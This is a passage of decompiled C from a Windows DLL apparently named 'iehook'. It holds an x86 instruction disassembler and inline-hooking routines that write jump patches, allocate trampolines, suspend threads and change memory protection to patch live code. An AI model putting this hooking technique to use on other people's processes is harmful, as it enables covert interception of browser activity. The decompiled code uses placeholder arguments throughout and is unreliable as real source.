        unsigned char v980 = *v9 + (char)v979; // 0x1000ec61
        *v9 = v980;
        *(char *)(v975 + (int32_t)v980) = 125;
        *v9 = *v9 + 1;
    }
    goto lab_0x1000ec7c;
  lab_0x1000f894:;
    char v1024 = *v14; // 0x1000f894
    if ((v1024 & 16) != 0) {
        goto lab_0x1000f936;
    } else {
        char v1025 = v1024; // 0x1000f8a5
        if (v6 == 0) {
            // 0x1000f8a7
            *v26 = v435 + 12;
            uint32_t v1026 = *v8; // 0x1000f8ae
            uint32_t v1027 = *v25 + v1026; // 0x1000f8b5
            *v28 = *v27 + v1026 / 0x80000000 + (int32_t)(v1027 < v1026);
            *v29 = v1027;
            *v30 = (int32_t)"[0x%08I64X] ANOMALY: Instruction \"%s\" is modifying the stack\n";
            _printf((char *)&g173);
            v1025 = *v14;
        }
        // 0x1000f8d0
        *v14 = v1025 | 16;
        goto lab_0x1000f8d7;
    }
  lab_0x1000ee7f:;
    int32_t v1028 = a1 + 342; // 0x1000ee84
    int16_t * v1029 = (int16_t *)v1028; // 0x1000ee84
    if (*v1029 >= 256) {
        // 0x1000ee8a
        *v26 = 2163;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"Operand1->Length <= 0xFF";
        __wassert();
    }
    char * v1030 = (char *)(a1 + 772); // 0x1000eea1
    char v1031 = *v1030; // 0x1000eea1
    char v1032 = v1031; // 0x1000eea5
    if (v1031 == 0) {
        // 0x1000eea7
        if (*v1029 == 0) {
            char v1033 = *v45 & 15; // 0x1000eeb9
            *v1030 = v1033;
            v1032 = v1033;
        } else {
            char v1034 = *(char *)v1028; // 0x1000eeae
            *v1030 = v1034;
            v1032 = v1034;
        }
    }
    uint16_t v1035 = *v1029; // 0x1000eec4
    int16_t v1036 = v1035; // 0x1000eec8
    char v1037 = v1032; // 0x1000eec8
    if (v1035 >= 256) {
        // 0x1000eeca
        *v26 = 2169;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"Operand1->Length <= 0xFF";
        __wassert();
        v1036 = *v1029;
        v1037 = *v1030;
    }
    unsigned char v1038 = v1037; // 0x1000eee1
    uint16_t v1039 = v1036; // 0x1000eee4
    uint32_t v1040 = v1039 < (int16_t)v1038 ? (int32_t)v1038 : (int32_t)v1039;
    if (v1040 >= 17) {
        // 0x1000ef02
        *v26 = 2172;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"tmpScale <= 16";
        __wassert();
    }
    char * v1041 = (char *)(a1 + 900); // 0x1000ef1c
    *v1041 = *v1041 & 7 | 8 * (char)v1040;
    int32_t * v1042 = (int32_t *)(a1 + 784); // 0x1000ef35
    *(int32_t *)(a1 + 872) = *v1042;
    int32_t * v1043 = (int32_t *)(a1 + 788); // 0x1000ef3e
    *(int32_t *)(a1 + 876) = *v1043;
    uint32_t v1044 = *v1042 + v1040; // 0x1000ef4b
    *(int32_t *)(a1 + 880) = v1044;
    *(int32_t *)(a1 + 884) = *v1043 + (int32_t)(v1044 < v1040);
    uint32_t v1045 = 2 * v1040; // 0x1000ef5d
    uint32_t v1046 = *v1042 + v1045; // 0x1000ef61
    *(int32_t *)(a1 + 888) = v1046;
    *(int32_t *)(a1 + 892) = *v1043 + (int32_t)(v1046 < v1045);
    *v1041 = *v1041 | 4;
    *(int32_t *)(a1 + 896) = 3;
    *(int32_t *)(a1 + 904) = v962;
    goto lab_0x1000f61f_2;
  lab_0x1000f03c:;
    char * v1047 = (char *)(a1 + 772); // 0x1000f03c
    char v1048 = *v1047; // 0x1000f03c
    int32_t v1049 = a1 + 342;
    int16_t * v1050 = (int16_t *)v1049;
    char v1051 = v1048; // 0x1000f040
    if (v1048 == 0) {
        uint16_t v1052 = *v1050;
        int16_t v1053 = v1052; // 0x1000f04b
        if (v1052 >= 256) {
            // 0x1000f04d
            *v26 = 2208;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"Operand1->Length <= 0xFF";
            __wassert();
            v1053 = *v1050;
        }
        // 0x1000f064
        if (v1053 == 0) {
            char v1054 = *v45 & 15; // 0x1000f076
            *v1047 = v1054;
            v1051 = v1054;
        } else {
            char v1055 = *(char *)v1049; // 0x1000f06b
            *v1047 = v1055;
            v1051 = v1055;
        }
    }
    unsigned char v1056 = v1051; // 0x1000f07c
    uint16_t v1057 = *v1050; // 0x1000f07f
    uint32_t v1058 = v1057 < (int16_t)v1056 ? (int32_t)v1056 : (int32_t)v1057;
    if (v1058 >= 17) {
        // 0x1000f09d
        *v26 = 2214;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"tmpScale <= 16";
        __wassert();
    }
    // 0x1000f0b7
    *v987 = *v987 & 7 | 8 * (char)v1058;
    if (*v1047 < 2) {
        // 0x1000f0d6
        *v26 = 2216;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"X86Instruction->Scale > 1";
        __wassert();
    }
    int32_t * v1059 = (int32_t *)(a1 + 784); // 0x1000f0f0
    *(int32_t *)(a1 + 872) = *v1059;
    int32_t * v1060 = (int32_t *)(a1 + 788); // 0x1000f0f9
    *(int32_t *)(a1 + 876) = *v1060;
    uint32_t v1061 = *v1059 + v1058; // 0x1000f106
    *(int32_t *)(a1 + 880) = v1061;
    *(int32_t *)(a1 + 884) = *v1060 + (int32_t)(v1061 < v1058);
    uint32_t v1062 = 2 * v1058; // 0x1000f118
    uint32_t v1063 = *v1059 + v1062; // 0x1000f11c
    *(int32_t *)(a1 + 888) = v1063;
    *(int32_t *)(a1 + 892) = *v1060 + (int32_t)(v1063 < v1062);
    *v987 = *v987 | 4;
    *(int32_t *)(a1 + 896) = 3;
    *(int32_t *)(a1 + 904) = v962;
    goto lab_0x1000f61f_2;
  lab_0x1000e7e9:
    // 0x1000e7e9
    *(char *)(v756 + (int32_t)v752) = 125;
    char v1064 = *v9 + 1; // 0x1000e7f8
    *v9 = v1064;
    v753 = v1064;
    goto lab_0x1000e7fe;
  lab_0x1000e7d2:
    // 0x1000e7d2
    *v28 = v754;
    *v29 = v755 + v756;
    int32_t v1065 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e7db
    char v1066 = *v9 + (char)v1065; // 0x1000e7e3
    *v9 = v1066;
    v752 = v1066;
    goto lab_0x1000e7e9;
  lab_0x1000f8d7:;
    char v1067 = *v14; // 0x1000f8d7
    int32_t v1068; // 0x1000b7b0
    if ((v1067 & 16) != 0) {
        goto lab_0x1000f936;
    } else {
        // 0x1000f8e0
        v1068 = *(int32_t *)(a1 + 912);
        if ((*v45 & 15) == 2) {
            goto lab_0x1000f8f5;
        } else {
            if ((v1068 & 3) != 0) {
                goto lab_0x1000f8ff;
            } else {
                goto lab_0x1000f8f5;
            }
        }
    }
  lab_0x1000f99e:
    // 0x1000f99e
    *v26 = 2339;
    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *v29 = (int32_t)L"Instruction->OperandCount == 1 && Operand1->Length";
    __wassert();
    // 0x1000f9b5
    v843 = (int32_t)*v841;
    goto lab_0x1000f7eb;
  lab_0x1000ea9e:
    // 0x1000ea9e
    *v29 = v926 + v927;
    int32_t v1086 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000eaa3
    char v1087 = *v9 + (char)v1086; // 0x1000eaab
    *v9 = v1087;
    v925 = v1087;
    goto lab_0x1000eab1;
  lab_0x1000eab1:;
    unsigned char v1088 = v925; // 0x1000eaf6
    char v1080; // 0x1000b7b0
    int32_t v1082; // 0x1000b7b0
    int32_t v1083; // 0x1000b7b0
    if ((v751 & 0x7800000) != 0x7800000) {
        char v1089 = v1088; // 0x1000eaf4
        if ((v751 & 0x800000) != 0) {
            int32_t v1090 = v1088; // 0x1000eaf6
            *v26 = (int32_t)"FPU_C0 ";
            *v28 = v1088 == -1 ? 0 : 256 - v1090;
            *v29 = v927 + v1090;
            int32_t v1091 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000eb1d
            v1089 = *v9 + (char)v1091;
            *v9 = v1089;
        }
        char v1092 = v1089; // 0x1000eb34
        char v1093 = v1092; // 0x1000eb32
        if ((v751 & 0x1000000) != 0) {
            int32_t v1094 = v1092; // 0x1000eb34
            *v26 = (int32_t)"FPU_C1 ";
            *v28 = v1092 == -1 ? 0 : 256 - v1094;
            *v29 = v927 + v1094;
            int32_t v1095 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000eb5b
            v1093 = *v9 + (char)v1095;
            *v9 = v1093;
        }
        char v1096 = v1093; // 0x1000eb72
        char v1097 = v1096; // 0x1000eb70
        if ((v751 & 0x2000000) != 0) {
            int32_t v1098 = v1096; // 0x1000eb72
            *v26 = (int32_t)"FPU_C2 ";
            *v28 = v1096 == -1 ? 0 : 256 - v1098;
            *v29 = v927 + v1098;
            int32_t v1099 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000eb99
            v1097 = *v9 + (char)v1099;
            *v9 = v1097;
        }
        char v1100 = v1097; // 0x1000ebb0
        v1080 = v1100;
        if ((v751 & 0x4000000) == 0) {
            goto lab_0x1000ebe5;
        } else {
            int32_t v1101 = v1100; // 0x1000ebb0
            *v26 = (int32_t)"FPU_C3 ";
            v1082 = v1100 == -1 ? 0 : 256 - v1101;
            v1083 = v1101;
            goto lab_0x1000ebce;
        }
    } else {
        int32_t v1102 = v1088; // 0x1000eac4
        if (v1088 == -1) {
            // 0x1000eae3
            *v26 = (int32_t)"FPU_ALL ";
            v1082 = 0;
            v1083 = v1102;
        } else {
            // 0x1000eacf
            *v26 = (int32_t)"FPU_ALL ";
            v1082 = 256 - v1102;
            v1083 = v1102;
        }
        goto lab_0x1000ebce;
    }
  lab_0x1000f8f5:
    if ((v1068 & 1) == 0) {
        goto lab_0x1000f936;
    } else {
        goto lab_0x1000f8ff;
    }
  lab_0x1000fa0b:
    // 0x1000fa0b
    *v26 = 2345;
    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *v29 = (int32_t)L"Instruction->OperandCount == 1 && Operand1->Length";
    __wassert();
    goto lab_0x1000fa22;
  lab_0x1000f769:;
    char v1103 = *v14; // 0x1000f769
    if ((v1103 & 16) == 0) {
        // 0x1000f772
        if ((*v823 & 4) != 0) {
            char v1104 = v1103; // 0x1000f77c
            if (v6 == 0) {
                uint32_t v1105 = *v8; // 0x1000f77e
                uint32_t v1106 = *v25 + v1105; // 0x1000f785
                *v26 = *v27 + v1105 / 0x80000000 + (int32_t)(v1106 < v1105);
                *v28 = v1106;
                *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected address size prefix\n";
                _printf((char *)&g173);
                v1104 = *v14;
            }
            // 0x1000f7a0
            *v14 = v1104 | 16;
        }
    }
    // 0x1000f7a7
    *v823 = *v823 & -5;
    int32_t v1107 = *(int32_t *)(*v1 + 4); // 0x1000f7ae
    if (v1107 == 1) {
        // 0x1000facf
        *v45 = *v45 & 15 | 64;
    } else {
        int32_t v1108 = v1107 - 2; // 0x1000f7b8
        if (v1108 == 0) {
            // 0x1000f7d3
            *v45 = *v45 & 15 | 32;
        } else {
            if (v1108 == 1) {
                // 0x1000f7c2
                *v45 = *v45 & 15 | -128;
            }
        }
    }
    goto lab_0x1000f8d7;
  lab_0x1000fa29:
    // 0x1000fa29
    *(int32_t *)(a1 + 912) = -(int32_t)*(int16_t *)(a1 + 342);
    if ((v844 & 16) == 0) {
        // 0x1000fa38
        if ((*v823 & 4) != 0) {
            if (v6 == 0) {
                uint32_t v1076 = *v8; // 0x1000fa44
                uint32_t v1077 = *v25 + v1076; // 0x1000fa4b
                *v26 = *v27 + v1076 / 0x80000000 + (int32_t)(v1077 < v1076);
                *v28 = v1077;
                *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected address size prefix\n";
                _printf((char *)&g173);
            }
            // 0x1000fa66
            *v14 = *v14 | 16;
        }
    }
    // 0x1000fa6d
    *v823 = *v823 & -5;
    int32_t v1078 = *(int32_t *)(*v1 + 4); // 0x1000fa74
    if (v1078 == 1) {
        // 0x1000faa4
        *v45 = *v45 & 15 | 64;
    } else {
        int32_t v1079 = v1078 - 2; // 0x1000fa7a
        if (v1079 == 0) {
            // 0x1000fa95
            *v45 = *v45 & 15 | 32;
        } else {
            if (v1079 == 1) {
                // 0x1000fa84
                *v45 = *v45 & 15 | -128;
            }
        }
    }
    goto lab_0x1000f8d7;
  lab_0x1000f7eb:
    // 0x1000f7eb
    *(int32_t *)(a1 + 912) = -v843;
    if ((*v14 & 16) == 0) {
        // 0x1000f7fc
        if ((*v823 & 4) != 0) {
            if (v6 == 0) {
                uint32_t v1069 = *v8; // 0x1000f808
                uint32_t v1070 = *v25 + v1069; // 0x1000f80f
                *v26 = *v27 + v1069 / 0x80000000 + (int32_t)(v1070 < v1069);
                *v28 = v1070;
                *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected address size prefix\n";
                _printf((char *)&g173);
            }
            // 0x1000f82a
            *v14 = *v14 | 16;
        }
    }
    // 0x1000f831
    *v823 = *v823 & -5;
    int32_t v1071 = *(int32_t *)(*v1 + 4); // 0x1000f838
    if (v1071 == 1) {
        // 0x1000f9c1
        *v45 = *v45 & 15 | 64;
        goto lab_0x1000f8d7;
    } else {
        int32_t v1072 = v1071 - 2; // 0x1000f842
        v842 = v1072;
        if (v1072 == 0) {
            // 0x1000f858
            *v45 = *v45 & 15 | 32;
            goto lab_0x1000f8d7;
        } else {
            goto lab_0x1000f845;
        }
    }
  lab_0x1000f8ff:;
    char v1073 = v1067; // 0x1000f903
    if (v6 == 0) {
        // 0x1000f905
        *v26 = v1068;
        uint32_t v1074 = *v8; // 0x1000f909
        *v28 = v435 + 12;
        uint32_t v1075 = *v25 + v1074; // 0x1000f914
        *v29 = *v27 + v1074 / 0x80000000 + (int32_t)(v1075 < v1074);
        *v30 = v1075;
        *(int32_t *)(v257 - 20) = (int32_t)"[0x%08I64X] ANOMALY: \"%s\" has invalid stack change 0x%02X\n";
        _printf((char *)&g173);
        v1073 = *v14;
    }
    // 0x1000f92f
    *v14 = v1073 | 16;
    goto lab_0x1000f936;
  lab_0x1000fa22:
    // 0x1000fa22
    goto lab_0x1000fa29;
  lab_0x1000f845:
    // 0x1000f845
    if (v842 == 1) {
        // 0x1000f84c
        *v45 = *v45 & 15 | -128;
    }
    goto lab_0x1000f8d7;
  lab_0x1000ebe5:
    // 0x1000ebe5
    *(char *)(v927 + (int32_t)v1080) = 125;
    char v1081 = *v9 + 1; // 0x1000ebf4
    *v9 = v1081;
    v924 = v1081;
    goto lab_0x1000ebfa;
  lab_0x1000ebce:
    // 0x1000ebce
    *v28 = v1082;
    *v29 = v1083 + v927;
    int32_t v1084 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000ebd7
    char v1085 = *v9 + (char)v1084; // 0x1000ebdf
    *v9 = v1085;
    v1080 = v1085;
    goto lab_0x1000ebe5;
}

// Address range: 0x1000ff40 - 0x1000ff73
int32_t function_1000ff40(void) {
    int32_t v1; // 0x1000ff40
    int32_t result; // 0x1000ff40
    char v2; // 0x1000ff42
    while (true) {
      lab_0x1000ff42_2:
        // 0x1000ff42
        result = v1;
        v2 = *(char *)result;
        if (v2 != -1) {
            goto lab_0x1000ff55;
        } else {
            // 0x1000ff49
            if (*(char *)(result + 1) != 37) {
                goto lab_0x1000ff55;
            } else {
                // 0x1000ff42
                v1 = *(int32_t *)*(int32_t *)(result + 2);
                goto lab_0x1000ff42_2;
            }
        }
    }
    // 0x1000ff72
    return result;
  lab_0x1000ff55:;
    int32_t v3; // 0x1000ff40
    if (v2 != -23) {
        if (v2 != -21) {
            return result;
        }
        // 0x1000ff68
        v3 = result + 2 + (int32_t)*(char *)(result + 1);
    } else {
        // 0x1000ff5a
        v3 = result + 5 + *(int32_t *)(result + 1);
    }
    // 0x1000ff42
    v1 = v3;
    goto lab_0x1000ff42_2;
}

// Address range: 0x1000ff80 - 0x1000ffbb
int32_t function_1000ff80(void) {
    // 0x1000ff80
    int32_t v1; // 0x1000ff80
    uint32_t result = v1 + 5; // 0x1000ff81
    uint32_t v2; // 0x1000ff80
    int32_t v3 = v2 - result;
    if ((v2 < result ? result - v2 : v3) < 0x7fff0001) {
        // 0x1000ff9a
        *(char *)v1 = -23;
        *(int32_t *)(v1 + 1) = v3;
        return result;
    }
    // 0x1000ffa7
    *(int16_t *)v1 = 0x25ff;
    *(int32_t *)(v1 + 2) = v1 + 6;
    return v1 + 10;
}

// Address range: 0x1000ffc0 - 0x100100cf
int32_t function_1000ffc0(int32_t a1, int32_t a2) {
    // 0x1000ffc0
    if ((uint32_t)g84 >= 64) {
        // 0x100100b0
        return 0;
    }
    // 0x1000ffd6
    int32_t v1; // 0x1000ffc0
    int32_t v2 = v1 + a1; // 0x1000ffda
    int32_t v3 = v2 <= -1 ? v2 - 0x7fff0000 : 1;
    int32_t v4 = v1 + a2; // 0x1000fff3
    uint32_t v5 = v4 <= -1 ? -0x80000 : v4 + 0x7ff80000;
    int32_t lpSystemInfo; // bp-72, 0x1000ffc0
    struct _SYSTEM_INFO * v6 = (struct _SYSTEM_INFO *)&lpSystemInfo; // bp-88, 0x1001002f
    lpSystemInfo = 0;
    GetSystemInfo((struct _SYSTEM_INFO *)&lpSystemInfo);
    if (v3 >= v5) {
        // 0x100100b0
        return 0;
    }
    int32_t v7 = 0;
    int32_t v8 = (int32_t)&v6;
    *(int32_t *)(v8 - 4) = 28;
    int32_t v9; // bp-36, 0x1000ffc0
    *(int32_t *)(v8 - 8) = (int32_t)&v9;
    int32_t v10 = v8 - 12; // 0x1001004d
    *(int32_t *)v10 = v3;
    int32_t v11 = VirtualQuery(&g173, (struct _MEMORY_BASIC_INFORMATION *)&g173, (int32_t)&g173); // 0x1001004e
    int32_t v12 = v7; // 0x10010056
    int32_t result; // 0x1000ffc0
    while (v11 != 0) {
        int32_t v13 = v10; // 0x1001005f
        int32_t v14 = v7; // 0x1001005f
        uint32_t v15; // 0x1000ffc0
        int32_t v16; // 0x1000ffc0
        if (v15 >= 108 && v16 == 0x10000) {
            // 0x10010070
            *(int32_t *)(v8 - 16) = 32;
            *(int32_t *)(v8 - 20) = 0x3000;
            *(int32_t *)(v8 - 24) = 108;
            v13 = v8 - 28;
            *(int32_t *)v13 = 0;
            int32_t * memory = VirtualAlloc(&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10010085
            v14 = (int32_t)memory;
            result = v14;
            if (memory != NULL) {
                goto lab_0x1001009e;
            }
        }
        // 0x10010090
        v7 = v14;
        int32_t v17 = v9 + v15; // 0x10010093
        v12 = v7;
        if (v17 >= v5) {
            // break -> 0x1001009a
            break;
        }
        v8 = v13;
        *(int32_t *)(v8 - 4) = 28;
        *(int32_t *)(v8 - 8) = (int32_t)&v9;
        v10 = v8 - 12;
        *(int32_t *)v10 = v17;
        v11 = VirtualQuery(&g173, (struct _MEMORY_BASIC_INFORMATION *)&g173, (int32_t)&g173);
        v12 = v7;
    }
    // 0x1001009a
    result = v12;
    if (v12 == 0) {
        // 0x100100b0
        return 0;
    }
  lab_0x1001009e:;
    int32_t v18 = 0; // 0x1001009e
    int32_t * v19 = (int32_t *)(4 * v18 + (int32_t)&g82);
    while (*v19 != 0) {
        int32_t v20 = v18 + 1; // 0x100100aa
        v18 = v20;
        if (v20 >= 64) {
            // 0x100100b0
            return result;
        }
        v19 = (int32_t *)(4 * v18 + (int32_t)&g82);
    }
    // 0x100100b9
    g84++;
    *v19 = result;
    // 0x100100b0
    return result;
}

// Address range: 0x100100d0 - 0x100101d7
int32_t function_100100d0(int32_t dwThreadId, uint32_t a2, int32_t a3) {
    int32_t * hThread = OpenThread(0x1fffff, false, dwThreadId); // 0x100100ef
    int32_t v1 = (int32_t)hThread; // 0x100100ef
    switch (v1) {
        default: {
            // 0x10010108
            if (SuspendThread(hThread) == -1) {
                // 0x100101ad
                CloseHandle(hThread);
                return _40___security_check_cookie_40_4();
            }
            int32_t lpContext = 0x10001; // bp-724, 0x10010121
            if (!GetThreadContext(hThread, (struct _CONTEXT *)&lpContext)) {
                // 0x100101c5
                return _40___security_check_cookie_40_4();
            }
            // 0x1001013b
            int32_t v2; // bp-760, 0x100100d0
            int32_t v3 = &v2; // 0x1001013c
            int32_t v4 = 0; // 0x1001013c
            uint32_t v5; // 0x100100d0
            while (v5 >= a2 && v5 < a3 + a2) {
                // 0x10010156
                *(int32_t *)(v3 - 4) = v1;
                ResumeThread(&g173);
                int32_t * v6 = (int32_t *)(v3 - 8);
                if (v4 > 2) {
                    // 0x10010193
                    *v6 = v1;
                    CloseHandle(&g173);
                    return _40___security_check_cookie_40_4();
                }
                // 0x1001015e
                *v6 = 100;
                Sleep((int32_t)&g173);
                *(int32_t *)(v3 - 12) = v1;
                SuspendThread(&g173);
                *(int32_t *)(v3 - 16) = (int32_t)&lpContext;
                v3 -= 20;
                *(int32_t *)v3 = v1;
                bool v7 = GetThreadContext(&g173, (struct _CONTEXT *)&g173); // 0x10010176
                v4++;
                if (!v7) {
                    // break -> 0x10010184
                    break;
                }
            }
        }
        case -1: {
        }
        case 0: {
            // 0x10010184
            return _40___security_check_cookie_40_4();
        }
    }
}

// Address range: 0x100101e0 - 0x10010267
int32_t function_100101e0(void) {
    int32_t threadPriority = GetThreadPriority(GetCurrentThread()); // 0x100101ef
    int32_t * threadHandle = GetCurrentThread(); // 0x100101fa
    int32_t v1 = (int32_t)threadHandle; // bp-28, 0x100101fc
    SetThreadPriority(threadHandle, (int32_t)&g173);
    int32_t v2 = &v1; // 0x1001020b
    if (g86 != 0) {
        // 0x1001020d
        int32_t v3; // bp-32, 0x100101e0
        int32_t v4 = &v3; // 0x1001020e
        int32_t v5 = 0; // 0x1001020e
        int32_t v6 = 4 * v5; // 0x10010219
        int32_t v7 = v4 - 4; // 0x1001021c
        *(int32_t *)v7 = *(int32_t *)(g85 + v6);
        ResumeThread(&g173);
        v4 -= 8;
        *(int32_t *)v4 = *(int32_t *)(g85 + v6);
        CloseHandle(&g173);
        v5++;
        v2 = v7;
        while (v5 < g86) {
            // 0x10010214
            v6 = 4 * v5;
            v7 = v4 - 4;
            *(int32_t *)v7 = *(int32_t *)(g85 + v6);
            ResumeThread(&g173);
            v4 -= 8;
            *(int32_t *)v4 = *(int32_t *)(g85 + v6);
            CloseHandle(&g173);
            v5++;
            v2 = v7;
        }
    }
    int32_t * v8 = (int32_t *)(v2 - 4); // 0x1001023f
    *v8 = g85;
    _free(&g173);
    *v8 = threadPriority;
    g85 = 0;
    g86 = 0;
    *(int32_t *)(v2 - 8) = (int32_t)GetCurrentThread();
    return SetThreadPriority(&g173, (int32_t)&g173);
}

// Address range: 0x10010270 - 0x100103ef
int32_t function_10010270(int32_t a1) {
    int32_t threadPriority = GetThreadPriority(GetCurrentThread()); // 0x10010297
    SetThreadPriority(GetCurrentThread(), (int32_t)&g173);
    int32_t processId = GetCurrentProcessId(); // 0x100102ab
    int32_t v1 = 4; // bp-80, 0x100102b2
    if (processId < 1) {
        int32_t v2 = &v1; // 0x100102b2
        *(int32_t *)(v2 - 4) = threadPriority;
        *(int32_t *)(v2 - 8) = (int32_t)GetCurrentThread();
        SetThreadPriority(&g173, (int32_t)&g173);
        function_100101e0();
        return _40___security_check_cookie_40_4();
    }
    int32_t v3 = processId; // bp-88, 0x100102d1
    int32_t v4; // bp-36, 0x10010270
    int32_t v5 = &v4;
    int32_t v6 = &v3; // 0x1001030b
    while (true) {
        // 0x100102f0
        v4 = 28;
        int32_t v7; // 0x10010270
        if (v7 == GetCurrentProcessId()) {
            // 0x100102fb
            GetCurrentThreadId();
        }
        // 0x10010307
        *(int32_t *)(v6 - 4) = v5;
        v6 -= 8;
        *(int32_t *)v6 = processId;
    }
}

// Address range: 0x100103f0 - 0x100104c1
int32_t function_100103f0(int32_t a1, uint32_t a2, int32_t a3) {
    // 0x100103f0
    *(int32_t *)(a3 + 8) = 0;
    *(int32_t *)(a3 + 12) = 0;
    *(int32_t *)a3 = 0;
    *(int32_t *)(a3 + 4) = 0;
    *(int32_t *)(a3 + 16) = 0;
    int32_t v1; // bp-1008, 0x100103f0
    int32_t v2; // bp-992, 0x100103f0
    int32_t v3; // 0x100103f0
    if (function_10001150(&v2, 1, v1, v3) == 0) {
        // 0x100104ac
        return _40___security_check_cookie_40_4();
    }
    int32_t v4 = &v1; // 0x1001043b
    int32_t * v5 = (int32_t *)(v4 - 4);
    if (a2 == 0) {
        // 0x1001049d
        *v5 = (int32_t)&v2;
        function_10001030((int32_t)&g173);
        // 0x100104ac
        return _40___security_check_cookie_40_4();
    }
    int32_t v6 = &v2;
    int32_t v7 = 0; // 0x10010494
    *v5 = 38;
    int32_t v8; // 0x100103f0
    *(int32_t *)(v4 - 8) = v8;
    *(int32_t *)(v4 - 12) = 0;
    *(int32_t *)(v4 - 16) = v8;
    *(int32_t *)(v4 - 20) = v6;
    int32_t v9 = function_10001050((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10010454
    while (v9 != 0) {
        // 0x10010460
        if (*(int32_t *)(v9 + 284) < 262) {
            // break -> 0x1001049d
            break;
        }
        int32_t v10 = *(int32_t *)(v9 + 296); // 0x1001048e
        v7 += v10;
        v8 += v10;
        if (v7 >= a2) {
            // break -> 0x1001049d
            break;
        }
        *v5 = 38;
        *(int32_t *)(v4 - 8) = v8;
        *(int32_t *)(v4 - 12) = 0;
        *(int32_t *)(v4 - 16) = v8;
        *(int32_t *)(v4 - 20) = v6;
        v9 = function_10001050((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
    }
    // 0x1001049d
    *v5 = v6;
    function_10001030((int32_t)&g173);
    // 0x100104ac
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100104d0 - 0x10010726
int32_t function_100104d0(int32_t * a1, int32_t a2) {
    // 0x100104d0
    int32_t v1; // bp-124, 0x100104d0
    int32_t v2 = &v1; // 0x100104e6
    if (g83 == 0) {
        struct _RTL_CRITICAL_SECTION * v3 = (struct _RTL_CRITICAL_SECTION *)&g81; // bp-128, 0x100104e8
        InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g81);
        _memset(&g82, 0, 256);
        g83 = 1;
        v2 = (int32_t)&v3;
    }
    int32_t v4 = v2 - 4; // 0x10010510
    *(int32_t *)v4 = (int32_t)&g81;
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g173);
    uint32_t v5 = function_1000ff40(); // 0x1001051d
    uint32_t v6 = function_1000ff40(); // 0x10010527
    int32_t * v7 = (int32_t *)(v2 - 8); // 0x1001052c
    *v7 = 80;
    int32_t * v8 = (int32_t *)(v2 - 12); // 0x10010531
    *v8 = 0;
    int32_t * v9 = (int32_t *)(v2 - 16); // 0x10010532
    int32_t v10; // bp-104, 0x100104d0
    *v9 = (int32_t)&v10;
    int32_t v11 = 0; // bp-112, 0x10010536
    _memset(NULL, 0, (int32_t)&g173);
    int32_t * v12 = (int32_t *)(v2 - 20); // 0x10010544
    *v12 = (int32_t)&v11;
    int32_t v13 = v2 - 24; // 0x10010545
    int32_t * v14 = (int32_t *)v13; // 0x10010545
    *v14 = 5;
    uint32_t v15 = function_100103f0((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10010549
    if (v15 < 5) {
        // 0x1001070d
        *(int32_t *)(v4 - 4) = (int32_t)&g81;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g173);
        return false;
    }
    // 0x1001055c
    *v7 = v5;
    function_10010270((int32_t)&g173);
    *v9 = v10;
    *v12 = 0;
    *v14 = v11;
    int32_t v16 = function_1000ffc0((int32_t)&g173, (int32_t)&g173); // 0x10010576
    int32_t v17 = v4; // 0x10010582
    int32_t v18 = 0; // 0x10010582
    if (v16 != 0) {
        int32_t processHandle = (int32_t)GetCurrentProcess(); // 0x10010588
        int32_t hProcess = 0; // bp-16, 0x10010590
        int32_t lpAddress = 0; // bp-12, 0x10010593
        int32_t v19 = &hProcess; // 0x10010599
        *v7 = v19;
        *v8 = 64;
        *v9 = v15;
        *v12 = v5;
        *v14 = processHandle;
        bool v20 = VirtualProtectEx((int32_t *)hProcess, (int32_t *)lpAddress, processHandle, (int32_t)&g173, &g173); // 0x100105a2
        int32_t v21 = v13; // 0x100105aa
        if (v20) {
            int32_t v22 = &lpAddress; // 0x100105b6
            *(int32_t *)(v2 - 28) = v22;
            *(int32_t *)(v2 - 32) = 64;
            *(int32_t *)(v2 - 36) = 108;
            *(int32_t *)(v2 - 40) = v16;
            int32_t v23 = v2 - 44; // 0x100105bc
            *(int32_t *)v23 = processHandle;
            bool v24 = VirtualProtectEx(&g173, &g173, (int32_t)&g173, (int32_t)&g173, &g173); // 0x100105bd
            int32_t v25 = v23; // 0x100105c5
            if (v24) {
                int32_t v26 = v16 + 44; // 0x100105cb
                int32_t v27 = v26; // 0x100105e3
                int32_t v28 = 0; // 0x100105e3
                char v29 = *(char *)(v5 - 44 - v16 + v27); // 0x100105e8
                *(char *)v27 = v29;
                *(char *)(v16 + 76 + v28) = v29;
                v28++;
                v27++;
                while (v28 != v15) {
                    // 0x100105e8
                    v29 = *(char *)(v5 - 44 - v16 + v27);
                    *(char *)v27 = v29;
                    *(char *)(v16 + 76 + v28) = v29;
                    v28++;
                    v27++;
                }
